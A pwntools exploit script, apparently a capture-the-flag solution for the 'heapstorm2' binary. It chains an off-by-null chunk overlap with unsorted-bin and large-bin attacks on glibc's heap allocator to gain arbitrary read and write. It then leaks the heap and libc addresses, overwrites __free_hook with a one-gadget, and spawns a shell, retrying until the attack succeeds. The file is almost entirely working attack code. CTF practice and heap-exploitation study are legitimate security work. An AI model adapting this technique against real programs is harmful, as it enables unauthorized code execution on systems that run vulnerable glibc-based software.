from pwn import *
import sys
context.arch 	= 'amd64'
status 			= sys.argv[1]
elf 			= ELF('./heapstorm2')
list_base 		= 0x13370800

if status == 'l':
	#io = process('./heapstorm2')
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elif status == 'd':
	#io = process('./heapstorm2',env = {"LD_PRELOAD":"./libc-2.24.so"})
	libc = ELF("./libc-2.24.so")
	context.log_level = 'debug'
else:
	info("INVALID STATUS")
	exit()

def choice(c):
	io.sendlineafter("Command: ",str(c))
def alloc(size):
	assert size > 12 and size <= 4096
	choice(1)
	io.sendlineafter("Size: ",str(size))
def update(index,size,data):
	assert size >= 0 and size <= 4096 and index >= 0 and index <= 15
	choice(2)
	io.sendlineafter("Index: ",str(index))
	io.sendlineafter("Size: ",str(size))
	io.sendafter("Content: ",data)
def delete(index):
	assert index >= 0 and index <= 15
	choice(3)
	io.sendlineafter("Index: ",str(index))
def show(index):
	assert index >= 0 and index <= 15
	choice(4)
	io.sendlineafter("Index: ",str(index))

while True:
	try:
		if status == 'l':
			io = process('./heapstorm2')
		else:
			io = process('./heapstorm2',env = {"LD_PRELOAD":"./libc-2.24.so"})
		alloc(0x18)		#0
		alloc(0x508)	#1
		alloc(0x18)		#2

		alloc(0x18)		#3
		alloc(0x508)	#4
		alloc(0x18)		#5

		alloc(0x18)		#6

		update(1,0x4f8,0x4f0*'\x00'+p64(0x500))
		delete(1)
		update(0,(0x18-12),(0x18-12)*'\x00')
		alloc(0x18)		#1
		alloc(0x4d8)	#7
		delete(1)
		delete(2)		#control 7
		alloc(0x30)		#1
		alloc(0x4e8)	#2

		update(4,0x4f8,0x4f0*'\x00'+p64(0x500))
		delete(4)
		update(3,(0x18-12),(0x18-12)*'\x00')
		alloc(0x18)		#4
		alloc(0x4d8)	#8
		delete(4)
		delete(5)
		alloc(0x40)		#4 0x5c0 -> unsorted
		#why more than 0x30? cause alloc 0x40 makes another chunk 0x4d0(differ from 2) and this 0x4d0 should finally be put in large bins
		delete(2)		# 0x060 -> unsorted
		alloc(0x4e8)	#2 0x060 -> used && 0x5c0 -> large
		delete(2)		# 0x060 -> unsorted

		uba_pay = 3*p64(0)+p64(0x4f1)+p64(0)+p64(list_base-0x20)
		update(7,len(uba_pay),uba_pay)

		lba_pay = 5*p64(0)+p64(0x4e1)+p64(0)+p64(list_base-0x18)+p64(0)+p64(list_base-0x38-5)
		update(8,len(lba_pay),lba_pay)

		alloc(0x48)		#2
		#fan-fucking-tastic!
		#if finding a matchable chunk in unsorted bin fails, 
		#this unmathable bin will be thrown in large bin with fwd->bk_nextsize->fd_nextsize = victim and fwd->bk = victim.
		#Meanwhile, ptmalloc will find the next unsorted bin by its bk(list_base-0x20)

		fix_pay = 4*p64(0)+p64(0)+p64(0x13377331)+p64(list_base+0x20)
		update(2,len(fix_pay),fix_pay)
		fix_pay = p64(list_base+0x20)+p64(0x100)+p64(list_base+0xa0)+p64(0x18)
		update(0,len(fix_pay),fix_pay)
		show(1)
		io.recvuntil('Chunk[1]: ')
		x = io.recv(0x18)
		heap_base = (u64(x[0:8])^u64(x[0x10:0x18]))&0xfffffffff000
		success("HEAP BASE -> %#x"%heap_base)
		fix_pay = p64(list_base+0x20)+p64(0x100)+p64(heap_base+0x70)+p64(0x8)
		update(0,len(fix_pay),fix_pay)
		show(1)
		io.recvuntil('Chunk[1]: ')
		libc_base = u64(io.recv(8))-(libc.sym['__malloc_hook']+0x10)-88
		success("LIBC BASE -> %#x"%libc_base)
		fix_pay = p64(list_base+0x20)+p64(0x100)+p64(libc_base+libc.sym['__free_hook'])+p64(0x8)+p64(0x13370700)+p64(0x8)
		update(0,len(fix_pay),fix_pay)
		update(2,0x8,"/bin/sh\x00")
		update(1,0x8,p64(libc_base+0x4526a))
		delete(2)
		io.interactive()

	except Exception,e:
		info(str(Exception)+str(e))

		io.close()
		continue
